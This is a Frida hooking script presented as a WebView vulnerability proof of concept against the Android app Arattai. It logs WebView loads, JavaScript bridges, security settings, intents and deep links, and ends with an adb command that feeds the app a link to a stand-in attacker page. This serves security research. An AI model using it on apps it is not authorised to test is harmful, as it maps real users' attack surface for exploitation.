/*
 * Arattai (com.aratai.chat) - WebView Vulnerability PoC via Frida
 *
 * This script hooks the WebView system to:
 * 1. Log every URL loaded in any WebView
 * 2. Detect addJavascriptInterface calls
 * 3. Monitor shouldOverrideUrlLoading decisions
 * 4. Dump WebView security settings
 * 5. Hook the AndroidBridge.postAction() to log calls
 *
 * Usage:
 *   frida -U -f com.aratai.chat -l frida_webview_hook.js --no-pause
 */

Java.perform(function() {
    console.log('[*] Arattai WebView PoC Hooks loaded');
    console.log('[*] Target: com.aratai.chat v1.54.0');
    console.log('');

    // ========== HOOK 1: WebView.loadUrl() ==========
    try {
        var WebView = Java.use('android.webkit.WebView');

        WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
            console.log('[WEBVIEW-LOAD] ' + url);

            // Check for attacker-controlled URLs
            if (url.indexOf('attacker.com') !== -1 ||
                url.indexOf('evil.com') !== -1 ||
                url.indexOf('file://') === 0) {
                console.log('[!!!] ATTACKER URL LOADED IN WEBVIEW: ' + url);
            }

            // Dump settings on first load
            var settings = this.getSettings();
            console.log('  JS Enabled: ' + settings.getJavaScriptEnabled());
            console.log('  File Access: ' + settings.getAllowFileAccess());
            console.log('  Content Access: ' + settings.getAllowContentAccess());
            console.log('  Mixed Content: ' + settings.getMixedContentMode());
            console.log('  DOM Storage: ' + settings.getDomStorageEnabled());

            return this.loadUrl(url);
        };

        WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function(url, headers) {
            console.log('[WEBVIEW-LOAD+HEADERS] ' + url);
            var iter = headers.entrySet().iterator();
            while (iter.hasNext()) {
                var entry = iter.next();
                console.log('  Header: ' + entry.getKey() + ' = ' + entry.getValue());
            }
            return this.loadUrl(url, headers);
        };

        console.log('[+] WebView.loadUrl() hooked');
    } catch(e) {
        console.log('[-] WebView.loadUrl() hook failed: ' + e.message);
    }

    // ========== HOOK 2: addJavascriptInterface ==========
    try {
        var WebView = Java.use('android.webkit.WebView');

        WebView.addJavascriptInterface.implementation = function(obj, name) {
            console.log('[JS-BRIDGE] addJavascriptInterface called!');
            console.log('  Bridge Name: "' + name + '"');
            console.log('  Object Class: ' + obj.getClass().getName());

            // Enumerate @JavascriptInterface methods
            var methods = obj.getClass().getMethods();
            for (var i = 0; i < methods.length; i++) {
                var annotations = methods[i].getAnnotations();
                for (var j = 0; j < annotations.length; j++) {
                    if (annotations[j].toString().indexOf('JavascriptInterface') !== -1) {
                        console.log('  @JavascriptInterface: ' + methods[i].getName() + '(' + methods[i].getParameterTypes().length + ' params)');
                    }
                }
            }

            return this.addJavascriptInterface(obj, name);
        };

        console.log('[+] addJavascriptInterface hooked');
    } catch(e) {
        console.log('[-] addJavascriptInterface hook failed: ' + e.message);
    }

    // ========== HOOK 3: WebSettings security settings ==========
    try {
        var WebSettings = Java.use('android.webkit.WebSettings');

        WebSettings.setAllowFileAccess.implementation = function(allow) {
            console.log('[SETTINGS] setAllowFileAccess(' + allow + ')');
            if (allow) {
                console.log('[!!!] DANGEROUS: File access enabled in WebView!');
            }
            return this.setAllowFileAccess(allow);
        };

        WebSettings.setAllowContentAccess.implementation = function(allow) {
            console.log('[SETTINGS] setAllowContentAccess(' + allow + ')');
            if (allow) {
                console.log('[!!!] DANGEROUS: Content access enabled in WebView!');
            }
            return this.setAllowContentAccess(allow);
        };

        WebSettings.setJavaScriptEnabled.implementation = function(flag) {
            console.log('[SETTINGS] setJavaScriptEnabled(' + flag + ')');
            return this.setJavaScriptEnabled(flag);
        };

        WebSettings.setMixedContentMode.implementation = function(mode) {
            var modeStr = mode === 0 ? 'ALWAYS_ALLOW' : mode === 1 ? 'NEVER_ALLOW' : 'COMPATIBILITY';
            console.log('[SETTINGS] setMixedContentMode(' + modeStr + ')');
            if (mode === 0) {
                console.log('[!!!] DANGEROUS: Mixed content ALWAYS allowed!');
            }
            return this.setMixedContentMode(mode);
        };

        console.log('[+] WebSettings security hooks installed');
    } catch(e) {
        console.log('[-] WebSettings hooks failed: ' + e.message);
    }

    // ========== HOOK 4: AndroidBridge.postAction() ==========
    try {
        var dtl = Java.use('dtl');

        dtl.postAction.overload('java.lang.String', 'java.lang.String', 'java.lang.String').implementation = function(action, payload, toast) {
            console.log('[BRIDGE-CALL] AndroidBridge.postAction()');
            console.log('  Action:  ' + action);
            console.log('  Payload: ' + payload);
            console.log('  Toast:   ' + toast);
            return this.postAction(action, payload, toast);
        };

        dtl.postAction.overload('java.lang.String', 'java.lang.String').implementation = function(action, payload) {
            console.log('[BRIDGE-CALL] AndroidBridge.postAction()');
            console.log('  Action:  ' + action);
            console.log('  Payload: ' + payload);
            return this.postAction(action, payload);
        };

        console.log('[+] AndroidBridge.postAction() hooked');
    } catch(e) {
        console.log('[-] AndroidBridge hook failed: ' + e.message);
    }

    // ========== HOOK 5: Intent.parseUri (intent:// handler) ==========
    try {
        var Intent = Java.use('android.content.Intent');

        Intent.parseUri.overload('java.lang.String', 'int').implementation = function(uri, flags) {
            console.log('[INTENT-PARSE] Intent.parseUri()');
            console.log('  URI: ' + uri);
            console.log('  Flags: ' + flags);

            if (uri.indexOf('intent:') === 0) {
                console.log('[!!!] intent:// URI being processed from WebView!');
            }

            return Intent.parseUri(uri, flags);
        };

        console.log('[+] Intent.parseUri() hooked');
    } catch(e) {
        console.log('[-] Intent.parseUri hook failed: ' + e.message);
    }

    // ========== HOOK 6: ExternalEntryPointActivity.s0() ==========
    try {
        var ExternalEntry = Java.use('com.arattai.home.presentation.ui.ExternalEntryPointActivity');

        ExternalEntry.s0.implementation = function() {
            console.log('[DEEPLINK] ExternalEntryPointActivity.s0() called');
            var intent = this.getIntent();
            console.log('  Action: ' + intent.getAction());
            console.log('  Data:   ' + intent.getData());
            console.log('  Type:   ' + intent.getType());
            console.log('  Component: ' + intent.getComponent());

            var extras = intent.getExtras();
            if (extras) {
                var keys = extras.keySet();
                var iter = keys.iterator();
                while (iter.hasNext()) {
                    var key = iter.next();
                    console.log('  Extra: ' + key + ' = ' + extras.get(key));
                }
            }

            return this.s0();
        };

        console.log('[+] ExternalEntryPointActivity.s0() hooked');
    } catch(e) {
        console.log('[-] ExternalEntryPointActivity hook failed: ' + e.message);
    }

    // ========== HOOK 7: MiniApp Fragment arguments ==========
    try {
        var zbj = Java.use('zbj');

        // Hook the fragment to capture when MiniApp WebView is opened
        console.log('[+] MiniApp Fragment (zbj) class found');
    } catch(e) {
        console.log('[-] zbj class not found: ' + e.message);
    }

    // ========== HOOK 8: shouldOverrideUrlLoading ==========
    try {
        var wbj = Java.use('wbj');

        wbj.a.implementation = function(url) {
            console.log('[URL-OVERRIDE] shouldOverrideUrlLoading: ' + url);
            var result = this.a(url);
            console.log('  Result: ' + (result ? 'INTERCEPTED' : 'LOADED IN WEBVIEW'));
            return result;
        };

        console.log('[+] wbj.shouldOverrideUrlLoading hooked');
    } catch(e) {
        console.log('[-] wbj hook failed: ' + e.message);
    }

    // ========== HOOK 9: evaluateJavascript ==========
    try {
        var WebView = Java.use('android.webkit.WebView');

        WebView.evaluateJavascript.implementation = function(script, callback) {
            console.log('[EVAL-JS] evaluateJavascript called');
            console.log('  Script (first 200): ' + script.substring(0, 200));
            return this.evaluateJavascript(script, callback);
        };

        console.log('[+] evaluateJavascript hooked');
    } catch(e) {
        console.log('[-] evaluateJavascript hook failed: ' + e.message);
    }

    console.log('');
    console.log('[*] All hooks installed. Now trigger deep links:');
    console.log('[*] adb shell am start -n com.aratai.chat/com.zoho.chat.ContactAction -a android.intent.action.VIEW -d "https://attacker.com/poc.html"');
    console.log('[*] Watch output for [!!!] markers indicating vulnerabilities');
});
